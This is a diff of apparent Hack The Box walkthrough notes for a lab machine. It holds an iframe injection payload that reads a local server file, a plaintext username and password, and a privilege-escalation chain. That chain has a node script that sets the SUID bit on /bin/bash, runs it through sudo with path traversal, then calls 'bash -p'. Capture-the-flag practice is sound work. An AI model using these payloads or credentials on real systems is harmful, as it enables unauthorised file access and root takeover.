@@ -29,7 +29,7 @@ Connection: close
 
 {"basket":[{"_id":"638f116eeb060210cbd83a93","title":"<iframe src=file:///var/www/dev/index.js height=1050px width=800px</iframe>","description":"It's toilet paper.","image":"toilet-paper.jpg","price":0.69,"currentStock":4212,"__v":0,"amount":1}]}
 
-username: Angoose
+username: angoose
 Password: IHeardPassphrasesArePrettySecure
 
 
@@ -39,4 +39,11 @@ echo "require('child_process').exec('chmod u+s /bin/bash')" > test.js
 
 sudo /usr/bin/node /usr/local/scripts/../../../../../dev/shm/test.js
 
+bash -p
+
+whoami roto
+
 ```
+
+
+https://www.hackthebox.com/achievement/machine/336799/523
